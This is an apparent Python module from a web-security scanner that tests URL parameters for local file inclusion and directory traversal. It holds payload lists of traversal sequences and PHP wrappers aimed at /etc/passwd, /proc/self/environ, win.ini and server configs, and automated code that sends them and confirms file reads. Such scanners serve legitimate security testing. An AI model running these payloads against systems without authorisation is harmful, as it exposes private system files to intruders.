"""
Local File Inclusion / Directory Traversal detection.

When an application accepts a filename (or path) parameter and uses it
to load a file, an attacker may be able to read files outside the
intended directory. This is one of the most common critical bugs.

Two related classes:

  Directory Traversal (path-based)
    ?file=../../../../etc/passwd
    ?file=..%2f..%2f..%2fetc%2fpasswd
    ?file=....//....//....//etc/passwd

  Local File Inclusion (wrapper-based, PHP-specific mostly)
    ?file=php://filter/convert.base64-encode/resource=index.php
    ?file=php://filter/read=string.rot13/resource=/etc/passwd
    ?file=data://text/plain;base64,SSBsb3ZlIFBIUA==

Detection oracles:

  1. Signature match — read a file with a known content signature
     and look for that signature in the response:

     /etc/passwd         → "root:x:0:0:"
     /etc/hosts          → "localhost"
     /proc/self/environ  → "PATH="
     C:\\Windows\\win.ini → "[fonts]"
     /windows/win.ini    → "[fonts]"

  2. Error message — trigger a "no such file or directory" error that
     reveals the injection worked (even if the file wasn't readable).

  3. Response diff — compare response to baseline. If reading
     ../../etc/passwd differs from reading ../../etc/nonexistent,
     the parameter IS being used to load files (blind LFI).

Severity:

  - Any positive match → critical (arbitrary file read)
  - Blind LFI (behavior differs but can't confirm a specific file) → high

Modes:

  --quick   Only ~6 high-signal payloads per parameter.
            Fast triage. Runs in seconds.
  default   Full payload set (~300 per param). Confirms everything.
            Slower but exhaustive.

Usage:

    from vuln.lfi import test_url

    findings = await test_url(
        "https://example.com/page?file=index.php",
        session, limiter)

    # CLI — quick triage
    python -m vuln.lfi "https://example.com/page?file=x" --quick

    # CLI — full scan
    python -m vuln.lfi "https://example.com/page?file=x" --rate 30 -v

    # CLI — authenticated, windows-only
    python -m vuln.lfi "https://example.com/page?file=x" \\
        --target-os windows --cookie "session=x"

Findings written to the store:
    one row per vulnerable parameter
"""

import asyncio
import base64
import hashlib
import re
from urllib.parse import (
    urlparse, parse_qs, urlencode, urlunparse,
)

from core.http import new_session, fetch, RateLimiter, parse_cookie_string
from core.output import info, success, warn, error


# ---------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------

# Files and their content signatures. When we "read" one of these
# files, if the signature appears in the response, we've confirmed LFI.
SIGNATURE_FILES = [
    # Linux / Unix
    ("/etc/passwd",            ["root:x:0:0:", "root:*:0:0:",
                                  "daemon:x:1:1"]),
    ("/etc/hosts",             ["127.0.0.1", "localhost"]),
    ("/etc/hostname",          []),
    ("/proc/self/environ",     ["PATH=", "HOME="]),
    ("/proc/version",          ["Linux version", "gcc"]),
    ("/etc/issue",             ["Linux", "Ubuntu", "Debian"]),

    # Windows
    ("C:\\Windows\\win.ini",   ["[fonts]", "[extensions]"]),
    ("C:\\winnt\\win.ini",     ["[fonts]", "[extensions]"]),
    ("C:\\boot.ini",           ["[boot loader]", "operating systems"]),
    ("C:\\Windows\\system.ini", ["[386enh]", "[drivers]"]),
    ("C:/Windows/win.ini",     ["[fonts]", "[extensions]"]),

    # Common app files
    ("/etc/apache2/apache2.conf", ["<Directory", "ServerRoot"]),
    ("/etc/nginx/nginx.conf",  ["user ", "http {", "events {"]),
    ("/var/log/apache2/access.log", []),
    ("/var/log/nginx/access.log",   []),
]


# Traversal prefix chains. Different apps strip different numbers of
# "../" so we try various depths.
TRAVERSAL_PREFIXES = [
    "../",
    "../../",
    "../../../",
    "../../../../",
    "../../../../../",
    "../../../../../../",
    "../../../../../../../",
    "../../../../../../../../",
    "..%2f",
    "..%2F",
    "%2e%2e%2f",
    "%2e%2e/",
    "..\\",
    "..\\..\\",
    "....//",
    "....\\\\",
    "..%252f",
]


# PHP wrapper payloads
PHP_WRAPPERS = [
    ("php_filter_base64",
     "php://filter/convert.base64-encode/resource={path}"),
    ("php_filter_rot13",
     "php://filter/read=string.rot13/resource={path}"),
    ("php_data_plain",
     "data://text/plain;base64,VEs=tk-data-canary"),
]


# Response body patterns that indicate a file NOT FOUND error was
# triggered by our payload (blind LFI confirmation).
NOT_FOUND_SIGNATURES = [
    r"no such file or directory",
    r"cannot open",
    r"failed to open stream",
    r"file not found",
    r"does not exist",
    r"warning.*include",
    r"include_path",
    r"the system cannot find the file",
]


# Common parameter names that might take a file path
COMMON_FILE_PARAMS = [
    "file", "filename", "path", "filepath", "document",
    "doc", "template", "view", "page", "include", "inc",
    "content", "load", "src", "source", "url", "uri",
    "resource", "asset", "image", "img", "logo",
    "style", "css", "js", "script", "lang", "language",
    "locale", "country", "theme", "skin", "layout",
    "config", "conf", "settings", "module", "mod",
    "action", "do", "op", "cmd", "download", "attachment",
    "dir", "folder", "root", "base", "home", "public",
]


# ---------------------------------------------------------------------
# URL helpers
# ---------------------------------------------------------------------

def _get_params(url: str) -> list[str]:
    return list(parse_qs(urlparse(url).query,
                          keep_blank_values=True).keys())


def _set_param_raw(url: str, name: str, value: str) -> str:
    """Set a param, preserving pre-encoded %XX in the value."""
    parsed = urlparse(url)
    qp = parse_qs(parsed.query, keep_blank_values=True)
    qp[name] = [value]
    pairs = []
    for k, vs in qp.items():
        for v in vs:
            pairs.append(f"{k}={v}")
    return urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, "&".join(pairs), parsed.fragment,
    ))


def _hash(body: str) -> str:
    return hashlib.sha1((body or "").encode("utf-8",
                                              errors="ignore")).hexdigest()


# ---------------------------------------------------------------------
# Detection helpers
# ---------------------------------------------------------------------

def _check_signature(body: str, signatures: list[str]) -> str | None:
    if not body:
        return None
    for sig in signatures:
        if sig and sig in body:
            return sig
    return None


def _looks_like_not_found(body: str) -> bool:
    if not body:
        return False
    low = body.lower()
    for pattern in NOT_FOUND_SIGNATURES:
        if re.search(pattern, low):
            return True
    return False


async def _try_payload(session, url: str, param: str, payload: str,
                        limiter, baseline: dict, cookies=None,
                        timeout: float = 10.0) -> dict | None:
    """Try one payload. Return finding data if we detect LFI."""
    test_url = _set_param_raw(url, param, payload)
    try:
        status, headers, body, _final = await fetch(
            session, test_url, limiter,
            method="GET", cookies=cookies, timeout=timeout,
            allow_redirects=False,
        )
    except Exception:
        return None

    if status is None:
        return None

    body = body or ""

    # Skip if response is basically identical to baseline
    if _hash(body) == baseline["hash"] and status == baseline["status"]:
        return None

    # Signature file check
    for path, signatures in SIGNATURE_FILES:
        if not signatures:
            continue
        tail = path.split("/")[-1]
        if tail not in payload:
            continue
        sig = _check_signature(body, signatures)
        if sig:
            return {
                "kind": "signature_match",
                "file": path,
                "signature": sig,
                "status": status,
                "size": len(body),
            }

    # PHP base64 filter wrapper
    if "convert.base64-encode" in payload:
        m = re.search(r"([A-Za-z0-9+/=]{40,})", body)
        if m:
            try:
                decoded = base64.b64decode(m.group(1))
                if decoded[:50] and all(
                        32 <= b < 127 or b in (9, 10, 13)
                        for b in decoded[:50]):
                    snippet = decoded[:200].decode("ascii",
                                                    errors="replace")
                    return {
                        "kind": "php_filter_base64",
                        "decoded_snippet": snippet,
                        "status": status,
                        "size": len(body),
                    }
            except Exception:
                pass

    # Data wrapper canary
    if "tk-data-canary" in body:
        return {
            "kind": "php_data_wrapper",
            "status": status,
            "size": len(body),
        }

    # Blind LFI: error that wasn't in baseline
    if _looks_like_not_found(body) and \
            not _looks_like_not_found(baseline["body"]):
        return {
            "kind": "blind_error",
            "status": status,
            "size": len(body),
        }

    return None


# ---------------------------------------------------------------------
# Payload list builder
# ---------------------------------------------------------------------

def _build_trials(files: list, quick: bool) -> list[tuple[str, str]]:
    """Return list of (payload, description) tuples to try."""
    trials: list[tuple[str, str]] = []

    if quick:
        # Quick mode: only the highest-signal payloads (~6 total)
        trials.append(("/etc/passwd", "absolute:/etc/passwd"))
        trials.append(("C:\\Windows\\win.ini",
                        "absolute:C:\\Windows\\win.ini"))
        # Two most common traversal depths
        for depth in (5, 7):
            prefix = "../" * depth
            trials.append((prefix + "etc/passwd",
                            f"traversal:{prefix}etc/passwd"))
        # One PHP wrapper
        trials.append(
            ("php://filter/convert.base64-encode/resource=/etc/passwd",
             "wrapper:php_filter_base64:/etc/passwd"))
        return trials

    # Full mode: exhaustive payload set
    # 1. Absolute paths
    for path, _ in files:
        trials.append((path, f"absolute:{path}"))

    # 2. Relative traversal for each prefix
    for path, _ in files:
        stripped = path.lstrip("/")
        stripped_fwd = stripped.replace("\\", "/")
        for prefix in TRAVERSAL_PREFIXES:
            if prefix.endswith("\\") and not path.startswith(
                    ("C:", "c:")):
                continue
            payload = prefix + stripped_fwd
            trials.append((payload, f"traversal:{prefix}{path}"))

    # 3. PHP wrappers
    for wrapper_name, tmpl in PHP_WRAPPERS:
        for target_file in ("/etc/passwd", "index.php", "config.php"):
            payload = tmpl.format(path=target_file)
            trials.append((payload,
                            f"wrapper:{wrapper_name}:{target_file}"))

    return trials


# ---------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------

async def test_url(url: str, session=None, limiter=None,
                    cookies=None, params: list[str] | None = None,
                    target_os: str = "auto",
                    verbose: bool = False,
                    timeout: float = 10.0,
                    rate: float = 10.0,
                    quick: bool = False) -> list[dict]:
    """Test a URL for LFI / path traversal on all params (or a subset).

    Args:
        url:          target URL (with or without query string)
        session:      aiohttp session (auto-created if None)
        limiter:      RateLimiter (auto-created at `rate` if None)
        cookies:      cookies dict for authenticated testing
        params:       explicit list of parameters to test
        target_os:    "linux", "windows", or "auto"
        verbose:      print each parameter as it's tested
        timeout:      per-request timeout in seconds
        rate:         requests per second (default 10)
        quick:        only try ~6 high-signal payloads per parameter

    Returns:
        List of finding dicts (empty if no LFI detected).
    """
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"

    # Filter signature files by OS
    if target_os == "linux":
        files = [f for f in SIGNATURE_FILES
                 if not f[0].startswith(("C:", "c:"))]
    elif target_os == "windows":
        files = [f for f in SIGNATURE_FILES
                 if f[0].startswith(("C:", "c:"))]
    else:
        files = SIGNATURE_FILES

    # Parameter candidates
    if params is None:
        in_url = _get_params(url)
        candidates = list(dict.fromkeys(in_url + COMMON_FILE_PARAMS))
    else:
        candidates = params

    if not candidates:
        return []

    own_session = session is None
    if own_session:
        session = new_session()
    if limiter is None:
        limiter = RateLimiter(rate=rate)

    mode = "quick" if quick else "full"
    info(f"lfi: testing {len(candidates)} parameter(s) on {url} "
         f"(os={target_os}, mode={mode}, rate={rate}/s)")

    findings: list[dict] = []

    try:
        # Baseline request
        try:
            base = await fetch(session, url, limiter, cookies=cookies,
                                timeout=timeout, allow_redirects=False)
        except Exception as e:
            warn(f"lfi: baseline failed: {type(e).__name__}: {e}")
            return []
        if base is None or base[0] is None:
            warn("lfi: target did not respond")
            return []

        baseline = {
            "status": base[0],
            "body": base[2] or "",
            "hash": _hash(base[2] or ""),
        }

        tested = 0
        for param in candidates:
            tested += 1
            if verbose:
                info(f"  [{tested}/{len(candidates)}] '{param}'")

            trials = _build_trials(files, quick)
            seen_payloads: set[str] = set()

            for payload, description in trials:
                if payload in seen_payloads:
                    continue
                seen_payloads.add(payload)

                r = await _try_payload(
                    session, url, param, payload, limiter,
                    baseline, cookies=cookies, timeout=timeout)
                if not r:
                    continue

                kind = r["kind"]
                if kind == "signature_match":
                    severity = "critical"
                    evidence = (f"Read {r['file']} — signature "
                                f"'{r['signature']}' found in response")
                elif kind == "php_filter_base64":
                    severity = "critical"
                    evidence = (f"php://filter wrapper decoded: "
                                f"{r['decoded_snippet'][:80]!r}")
                elif kind == "php_data_wrapper":
                    severity = "high"
                    evidence = "php://data wrapper executed"
                elif kind == "blind_error":
                    severity = "high"
                    evidence = (f"File-not-found error triggered by "
                                f"payload ({description})")
                else:
                    continue

                finding = {
                    "type": "lfi",
                    "severity": severity,
                    "url": url,
                    "param": param,
                    "injection_kind": "query",
                    "method": "GET",
                    "payload": payload[:300],
                    "http_status": r["status"],
                    "evidence": evidence,
                    "data": {
                        "kind": kind,
                        "payload_description": description,
                        "file": r.get("file"),
                        "signature": r.get("signature"),
                        "decoded_snippet": r.get("decoded_snippet"),
                        "response_size": r.get("size"),
                    },
                }
                findings.append(finding)
                success(f"  [VULN] {param} → {kind}: "
                        f"{evidence[:120]}")
                if verbose:
                    info(f"      payload: {payload[:200]}")
                # One finding per parameter is enough
                break

        return findings
    finally:
        if own_session:
            await session.close()


# ---------------------------------------------------------------------
# CLI entry
# ---------------------------------------------------------------------

async def run(target: str, store=None, verbose: bool = False,
               cookie: str | None = None,
               params: list[str] | None = None,
               target_os: str = "auto",
               rate: float = 10.0,
               quick: bool = False) -> list[dict]:
    """CLI entry. Writes findings to store if provided."""
    cookies = parse_cookie_string(cookie) if cookie else None
    findings = await test_url(target, cookies=cookies, params=params,
                                target_os=target_os, verbose=verbose,
                                rate=rate, quick=quick)

    print()
    if not findings:
        info(f"no LFI detected on {target}")
    else:
        success(f"{len(findings)} LFI finding(s)")

    if store is not None:
        for f in findings:
            store.add_finding({
                "module": "lfi",
                "type": f["type"],
                "severity": f["severity"],
                "target": f["url"],
                "param": f["param"],
                "payload": f["payload"],
                "evidence": f["evidence"],
                "data": f["data"],
            })
        if findings:
            success(f"wrote {len(findings)} finding(s) to store")

    return findings


# ---------------------------------------------------------------------
# CLI when run directly
# ---------------------------------------------------------------------

def _cli():
    import argparse
    p = argparse.ArgumentParser(
        prog="vuln.lfi",
        description="Detect Local File Inclusion / path traversal.",
    )
    p.add_argument("target", help="URL to test (with ?file=... if specific)")
    p.add_argument("--param", action="append",
                   help="test only this parameter name (repeatable)")
    p.add_argument("--cookie", default=None,
                   help="cookie string for authenticated testing")
    p.add_argument("--target-os", choices=["linux", "windows", "auto"],
                   default="auto",
                   help="restrict to one OS's files (default: auto)")
    p.add_argument("--rate", type=float, default=10.0,
                   help="requests per second (default 10)")
    p.add_argument("--quick", action="store_true",
                   help="only try the highest-signal payloads "
                        "(~6 instead of ~300)")
    p.add_argument("--store", action="store_true",
                   help="write findings to active workspace")
    p.add_argument("-v", "--verbose", action="store_true")
    args = p.parse_args()

    store = None
    if args.store:
        from core.workspace import get_active, get_workspace
        from core.store import open_store
        active = get_active()
        if not active:
            warn("no active workspace; use `toolkit workspace switch`")
        else:
            ws = get_workspace(active)
            store = open_store(ws.db_path, workspace_name=active)

    asyncio.run(run(
        args.target, store=store, verbose=args.verbose,
        cookie=args.cookie, params=args.param,
        target_os=args.target_os, rate=args.rate,
        quick=args.quick))


if __name__ == "__main__":
    _cli()